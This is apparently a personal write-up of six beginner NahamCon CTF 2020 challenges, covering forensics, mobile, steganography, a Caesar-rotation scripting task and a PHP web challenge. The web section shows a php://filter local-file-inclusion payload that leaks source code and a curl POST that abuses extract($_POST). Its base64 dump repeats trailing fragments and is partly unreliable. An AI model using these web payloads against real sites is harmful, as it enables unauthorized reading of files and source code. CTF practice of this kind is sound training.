---
title: "NahamCon CTF 2020 Writeup"
slug: "nahamcon-ctf-2020-writeup"
priority: 2
editor: "wysiwyg"
revisionCount: 2
id: 46
createdAt: "2020-06-15T23:56:56Z"
createdBy: "boschko"
updatedAt: "2021-06-08T06:02:02Z"
updatedBy: "boschko"
ownedBy: "boschko"
views: 4
---
<h3 id="bkmrk-nahamcon-ctf-2020-wr">NahamCon CTF 2020 Writeup</h3>
<p id="bkmrk-url%3A-https%3A%2F%2Fctf.nah">URL: https://ctf.nahamcon.com/challenges</p>
<p id="bkmrk-i-got-board-on-the-w">I got board on the weekend and decided to do something different so I decided to give the NahamCon CRF a try. Even though I arrived a day late I still had a lot of fun! The event was over too soon and there were a lot of other challenges I really wanted to tackle but oh well....</p>
<p id="bkmrk-%C2%A0"> </p>
<hr id="bkmrk-"><p id="bkmrk-%C2%A0-0"> </p>
<h5 id="bkmrk-%5Bforensics%5D%3A-microso">[Forensics]: Microsooft (100 points)</h5>
<p id="bkmrk-description%3A-we-have">Description: We have to use Microsoft Word at the office!? Oof…</p>
<p id="bkmrk-attachment%3A-microsoo">Attachment: microsooft.docx</p>
<p id="bkmrk-solution%3A">Solution:</p>
<pre id="bkmrk-unzip-microsooft.doc"><code class="language-bash">unzip microsooft.docx

find .-name'*' | xargs grep flag 2&gt;/dev/null
flag{oof_is_right_why_gfxdata_though}</code></pre>
<h5 id="bkmrk-%C2%A0-1"> </h5>
<h5 id="bkmrk-%5Bweb%5D%3A-phphonebook-%28">[Web]: Phphonebook (100 points)</h5>
<p id="bkmrk-description%3A-ring-ri">Description: <br>Ring ring! Need to look up a number? This phonebook has got you covered! But you will only get a flag if it is an emergency!</p>
<p id="bkmrk-connect-here%3A-http%3A%2F">Connect here: http://jh2i.com:50002</p>
<pre id="bkmrk-sorry%21-you-are-in-%2Fi"><code class="language-text">Sorry! You are in /index.php/?file=
The phonebook is located at phphonebook.php</code></pre>
<p id="bkmrk-if-you-access-below%2C">If you access below, you can see the contents of phphonebook.php.http://jh2i.com:50002/index.php/?file=php://filter/convert.base64-encode/resource=phphonebook</p>
<pre id="bkmrk-pcfet0nuwvbfigh0bww-"><code class="language-">PCFET0NUWVBFIGh0bWw + CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5QaHBob25lYm9vazwvdGl0bGU + CiAgICA8bGluayBocmVmPSJtYWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICA8L2hlYWQ + CgogIDxib2R5IGNsYXNzPSJiZyI + CiAgICA8aDEgaWQ9ImhlYWRlciI + IFdlbGNvbWUgdG8gdGhlIFBocGhvbmVib29rIDwvaDE + CgogICAgPGRpdiBpZD0iaW1fY29udGFpbmVyIj4KCiAgICAgIDxpbWcgc3JjPSJib29rLmpwZyIgd2lkdGg9IjUwJSIgaGVpZ2h0PSIzMCUiLz4KCiAgICAgIDxwIGNsYXNzPSJkZXNjIj4KICAgICAgVGhpcyBwaHBob25lYm9vayB3YXMgbWFkZSB0byBsb29rIHVwIGFsbCBzb3J0cyBvZiBudW1iZXJzISBIYXZlIGZ1bi4uLgogICAgICA8L3A + CgogICAgPC9kaXY + Cjxicj4KPGJyPgogICAgPGRpdj4KICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249IiMiPgogICAgICAgIDxsYWJlbCBpZD0iZm9ybV9sYWJlbCI + RW50ZXIgbnVtYmVyOiA8L2xhYmVsPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJudW1iZXIiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQiPgogICAgICA8L2Zvcm0 + CiAgICA8L2Rpdj4KCiAgICA8ZGl2IGlkPSJwaHBfY29udGFpbmVyIj4KICAgIDw / cGhwCiAgICAgIGV4dHJhY3QoJF9QT1NUKTsKCiAgICAJaWYgKGlzc2V0KCRlbWVyZ2VuY3kpKXsKICAgIAkJZWNobyhmaWxlX2dldF9jb250ZW50cygiL2ZsYWcudHh0IikpOwogICAgCX0KICAgID8 + CiAgPC9kaXY + CiAgPC9icj4KICA8L2JyPgogIDwvYnI + CgoKPGRpdiBzdHlsZT0icG9zaXRpb246Zml4ZWQ7IGJvdHRvbToxJTsgbGVmdDoxJTsiPgo8YnI + PGJyPjxicj48YnI + CjxiPiBOT1QgQ0hBTExFTkdFIFJFTEFURUQ6PC9iPjxicj5USEFOSyBZT1UgdG8gSU5USUdSSVRJIGZvciBzdXBwb3J0aW5nIE5haGFtQ29uIGFuZCBOYWhhbUNvbiBDVEYhCjxwPgo8aW1nIHdpZHRoPTYwMHB4IHNyYz0iaHR0cHM6Ly9kMjR3dXE2bzk1MWkyZy5jbG91ZGZyb250Lm5ldC9pbWcvZXZlbnRzL2lkLzQ1Ny80NTc3NDgxMjEvYXNzZXRzL2Y3ZGEwZDcxOGViNzdjODNmNWNiNjIyMWEwNmEyZjQ1LmludGkucG5nIj4KPC9wPgo8L2Rpdj4KCiAgPC9ib2R5Pgo8L2h0bWw +pKXsKICAgIAkJZWNobyhmaWxlX2dldF9jb250ZW50cygiL2ZsYWcudHh0IikpOwogICAgCX0KICAgID8 + CiAgPC9kaXY + CiAgPC9icj4KICA8L2JyPgogIDwvYnI + CgoKPGRpdiBzdHlsZT0icG9zaXRpb246Zml4ZWQ7IGJvdHRvbToxJTsgbGVmdDoxJTsiPgo8YnI + PGJyPjxicj48YnI + CjxiPiBOT1QgQ0hBTExFTkdFIFJFTEFURUQ6PC9iPjxicj5USEFOSyBZT1UgdG8gSU5USUdSSVRJIGZvciBzdXBwb3J0aW5nIE5haGFtQ29uIGFuZCBOYWhhbUNvbiBDVEYhCjxwPgo8aW1nIHdpZHRoPTYwMHB4IHNyYz0iaHR0cHM6Ly9kMjR3dXE2bzk1MWkyZy5jbG91ZGZyb250Lm5ldC9pbWcvZXZlbnRzL2lkLzQ1Ny80NTc3NDgxMjEvYXNzZXRzL2Y3ZGEwZDcxOGViNzdjODNmNWNiNjIyMWEwNmEyZjQ1LmludGkucG5nIj4KPC9wPgo8L2Rpdj4KCiAgPC9ib2R5Pgo8L2h0bWw +pKXsKICAgIAkJZWNobyhmaWxlX2dldF9jb250ZW50cygiL2ZsYWcudHh0IikpOwogICAgCX0KICAgID8 + CiAgPC9kaXY + CiAgPC9icj4KICA8L2JyPgogIDwvYnI + CgoKPGRpdiBzdHlsZT0icG9zaXRpb246Zml4ZWQ7IGJvdHRvbToxJTsgbGVmdDoxJTsiPgo8YnI + PGJyPjxicj48YnI + CjxiPiBOT1QgQ0hBTExFTkdFIFJFTEFURUQ6PC9iPjxicj5USEFOSyBZT1UgdG8gSU5USUdSSVRJIGZvciBzdXBwb3J0aW5nIE5haGFtQ29uIGFuZCBOYWhhbUNvbiBDVEYhCjxwPgo8aW1nIHdpZHRoPTYwMHB4IHNyYz0iaHR0cHM6Ly9kMjR3dXE2bzk1MWkyZy5jbG91ZGZyb250Lm5ldC9pbWcvZXZlbnRzL2lkLzQ1Ny80NTc3NDgxMjEvYXNzZXRzL2Y3ZGEwZDcxOGViNzdjODNmNWNiNjIyMWEwNmEyZjQ1LmludGkucG5nIj4KPC9wPgo8L2Rpdj4KCiAgPC9ib2R5Pgo8L2h0bWw +G8gSU5USUdSSVRJIGZvciBzdXBwb3J0aW5nIE5haGFtQ29uIGFuZCBOYWhhbUNvbiBDVEYhCjxwPgo8aW1nIHdpZHRoPTYwMHB4IHNyYz0iaHR0cHM6Ly9kMjR3dXE2bzk1MWkyZy5jbG91ZGZyb250Lm5ldC9pbWcvZXZlbnRzL2lkLzQ1Ny80NTc3NDgxMjEvYXNzZXRzL2Y3ZGEwZDcxOGViNzdjODNmNWNiNjIyMWEwNmEyZjQ1LmludGkucG5nIj4KPC9wPgo8L2Rpdj4KCiAgPC9ib2R5Pgo8L2h0bWw +G8gSU5USUdSSVRJIGZvciBzdXBwb3J0aW5nIE5haGFtQ29uIGFuZCBOYWhhbUNvbiBDVEYhCjxwPgo8aW1nIHdpZHRoPTYwMHB4IHNyYz0iaHR0cHM6Ly9kMjR3dXE2bzk1MWkyZy5jbG91ZGZyb250Lm5ldC9pbWcvZXZlbnRzL2lkLzQ1Ny80NTc3NDgxMjEvYXNzZXRzL2Y3ZGEwZDcxOGViNzdjODNmNWNiNjIyMWEwNmEyZjQ1LmludGkucG5nIj4KPC9wPgo8L2Rpdj4KCiAgPC9ib2R5Pgo8L2h0bWw +</code></pre>
<p id="bkmrk-from-which-the-follo">From which the following is obtained.</p>
<pre id="bkmrk-%3Cbr%3E-%3Cdiv%3E-%3Cform-met"><code class="language-html">&lt;br&gt;
    &lt;div&gt;
      &lt;form method="POST" action="#"&gt;
        &lt;label id="form_label"&gt;Enter number: &lt;/label&gt;
        &lt;input type="text" name="number"&gt;
        &lt;input type="submit" value="Submit"&gt;
      &lt;/form&gt;
    &lt;/div&gt;

    &lt;div id="php_container"&gt;
    &lt;?php
      extract($_POST);

    	if (isset($emergency)){
    		echo(file_get_contents("/flag.txt"));
    	}
    ?&gt;</code></pre>
<p id="bkmrk-it-seems-that-you-sh">It seems that you should POST emergency. It may have been solved by just Guessing from the text of the challenge.</p>
<pre id="bkmrk-curl--d-emergency%3D1-"><code class="language-bash">curl -d emergency=1 http://jh2i.com:50002/phphonebook.php
flag{phon3_numb3r_3xtr4ct3d}</code></pre>
<h5 id="bkmrk-%C2%A0-4"> </h5>
<h5 id="bkmrk-%5Bscripting%5D%3A-rotten-">[Scripting]: Rotten (100 points)</h5>
<p id="bkmrk-description%3Aick%2C-thi">Description:<br>Ick, this salad doesn't taste too good!</p>
<p id="bkmrk-connect-with%3A-nc-jh2">Connect with: nc jh2i.com 50034</p>
<p id="bkmrk-solution%3Ait-was-afte">Solution:<br>It was after the event, but I tried it because the server was alive. If you try to connect them manually, the result will be as follows.</p>
<pre id="bkmrk-nc-jh2i.com-50034-se"><code class="language-bash">nc jh2i.com 50034
send back this line exactly.no flag here, just filler.
send back this line exactly.no flag here, just filler.
nziy wvxf ocdn gdiz zsvxogt.ij agvb czmz, epno adggzm.
send back this line exactly.no flag here, just filler.
kwfv tsuc lzak dafw wpsuldq. uzsjsulwj 19 gx lzw xdsy ak'g'
send back this line exactly.character 19 of the flag is'o'
:</code></pre>
<p id="bkmrk-if-you-rot%28n%29-the-di">If you rot(n) the displayed sentence and send it back, some of them will contain a flag character.</p>
<p id="bkmrk-i%27ve-done-a-few-back">I've done a few background checks and it looks like'}' appears in the 30th character (starting with 0), so I know the length of the flag (31).</p>
<p id="bkmrk-below-is-the-script-">Below is the script which rot() the function from the beginning</p>
<pre id="bkmrk-%23%21%2Fusr%2Fbin%2Fenv-pytho"><code class="language-python">#!/usr/bin/env python
from pwn import *

def rot(s, n):
    s = bytearray(s)
    for i, c in enumerate(s):
        if 0x41 &lt;= c &lt;= 0x5a:
            s[i] = ((c-0x41+n) % 0x1a) + 0x41
        elif 0x61 &lt;= c &lt;= 0x7a:
            s[i] = ((c-0x61+n) % 0x1a) + 0x61
    return s

flag_len = 31
flag = [""] * flag_len
count = 0
s = remote('jh2i.com', 50034)
while 1:
    q = s.recvline()
    for n in xrange(26):
        a = rot(q, n)
        if "character" in a:
            result = (re.findall(r'[0-9]+', a))
            pos = int(result[0])
            if flag[pos] != chr(a[-3]):
                flag[pos] = chr(a[-3])
                print("".join(flag))
                count += 1
            #print("char = {}".format(chr(a[-3])))
        if "send" in a:
            s.sendline(a)
            break
    if count &gt;= flag_len:
        break
s.close()</code></pre>
<p id="bkmrk-explanation%3A">Explanation:</p>
<p id="bkmrk---the-characters-act">- The characters actually found are put in a list called flag.<br>- The person who found "send" or "character" as a result of rot is the one that was correctly rotated.<br>- It was a bit strange, but since a should contain letters, a[-3] was taken as a numerical value, so I am converting it to letters with chr().<br>- [-3] is because it is the third character from the back including the line feed.</p>
<pre id="bkmrk-.%2Frotten_solve.py-%5B%2B"><code class="language-bash">./rotten_solve.py
[+] Opening connection to jh2i.com on port 50034: Done
r
lr
lyr
loyr
floyr
floyur
floyur}
floyurr}
floyurer}
floyourer}
floyourers}
floyou_rers}
fl{oyou_rers}
fl{noyou_rers}
fl{noyou_rcers}
fl{noyou_rcesrs}
fl{no_you_rcesrs}
fl{no_youo_rcesrs}
fl{no_youo_yrcesrs}
fl{no_youko_yrcesrs}
fl{no_youkow_yrcesrs}
fl{no_youkow_yurcesrs}
flg{no_youkow_yurcesrs}
flg{now_youkow_yurcesrs}
flg{now_youkow_yurcaesrs}
flag{now_youkow_yurcaesrs}
flag{now_youkow_yourcaesrs}
flag{now_you_kow_yourcaesrs}
flag{now_you_know_yourcaesrs}
flag{now_you_know_yourcaesars}
flag{now_you_know_your_caesars}
[*] Closed connection to jh2i.com port 50034</code></pre>
<p id="bkmrk-%C2%A0-5"> </p>
<h5 id="bkmrk-%5Bmobile%5D%3A-candroid-%28">[Mobile]: Candroid (50 points)</h5>
<p id="bkmrk-description%3A-i-think">Description: I think I can, I think I can!</p>
<p id="bkmrk-attachment%3A-candroid">Attachment: candroid.apk</p>
<p id="bkmrk-solution%3A-just-unzip">Solution: Just unzip and look for flag{}.</p>
<pre id="bkmrk-%24-unzip-candroid.apk"><code class="language-bash">$ unzip candroid.apk

$ find .-name'*' | xargs grep flag 2&gt;/dev/null
Binary file ./classes.dex matches
./META-INF/CERT.SF:Name: res/layout/activity_flag.xml
./META-INF/MANIFEST.MF:Name: res/layout/activity_flag.xml
Binary file ./candroid.apk matches
Binary file ./resources.arsc matches

$ strings resources.arsc | grep flag
flag{4ndr0id_1s_3asy}</code></pre>
<h5 id="bkmrk-%C2%A0-6"> </h5>
<h5 id="bkmrk-%5Bmobile%5D%3A-simple-app">[Mobile]: Simple App (50 points)</h5>
<p id="bkmrk-description%3A-here%27s-">Description: Here's a simple Android app. Can you get the flag?</p>
<p id="bkmrk-attachment%3A-simple-a">Attachment: simple-app.apk</p>
<p id="bkmrk-solution%3A-this-is-si">Solution: This is similar to the challenge mentioned above. Now it's in classes.dex.</p>
<pre id="bkmrk-%24-unzip-simple-app.a"><code class="language-bash">$ unzip simple-app.apk

$ find .-name'*' | xargs grep flag 2&gt;/dev/null

$ strings classes.dex | grep flag
flag{3asY_4ndr0id_r3vers1ng}</code></pre>
<p id="bkmrk-%C2%A0-7"> </p>
<h5 id="bkmrk-%5Bsteg%5D%3A-ksteg-%2850-po">[Steg]: Ksteg (50 points)</h5>
<p id="bkmrk-description%3A-this-mu">Description: This must be a typo…. it was kust one letter away!</p>
<p id="bkmrk-attachment%3A-luke.jpg">Attachment: luke.jpg</p>
<p id="bkmrk-solution%3A-0">Solution:</p>
<p id="bkmrk-%E2%80%9Ckust%E2%80%9D-is-a-%E2%80%9Cjust%E2%80%9D-t">“Kust” is a “just” typo, and “ksteg” is a “jsteg”.</p>
<pre id="bkmrk-jsteg-reveal-luke.jp"><code class="language-bash">jsteg reveal luke.jpg 
flag{yeast_bit_steganography_oops_another_typo}</code></pre>
<p id="bkmrk-there-were-a-few-oth">There were a few other flags obtained but there not really "write-up worthy"</p>
<p id="bkmrk-%C2%A0-9"> </p>
<hr id="bkmrk--0"><h4 id="bkmrk-by-boschko">By Boschko</h4>
<ul id="bkmrk-my-hack-the-box%3A-htt"><li class="graf graf--p">My Hack The Box: <a class="markup--anchor markup--p-anchor" href="https://www.hackthebox.eu/home/users/profile/37879" target="_blank" rel="nofollow noopener" data-href="https://www.hackthebox.eu/home/users/profile/37879">https://www.hackthebox.eu/home/users/profile/37879</a></li>
<li class="graf graf--p">My Website: <a class="markup--anchor markup--p-anchor" href="https://olivierlaflamme.github.io/" target="_blank" rel="noopener nofollow noopener" data-href="https://olivierlaflamme.github.io/">https://olivierlaflamme.github.io/</a></li>
<li class="graf graf--p">My GitHub: <a class="markup--anchor markup--p-anchor" href="https://github.com/OlivierLaflamme" target="_blank" rel="noopener nofollow noopener" data-href="https://github.com/OlivierLaflamme">https://github.com/OlivierLaflamme</a></li>
<li class="graf graf--p">My WeChat QR below:</li>
</ul><figure id="bkmrk--15" class="graf graf--figure graf--layoutOutsetLeft"><img class="graf-image" src="https://cdn-images-1.medium.com/max/750/0*Jh0zrZrfyn8WjkDn.png" data-image-id="0*Jh0zrZrfyn8WjkDn.png" data-width="142" data-height="144"><div>
<div></div>
</div>
</figure><p id="bkmrk-%C2%A0-12"> </p>
<p id="bkmrk-%C2%A0-13"> </p>
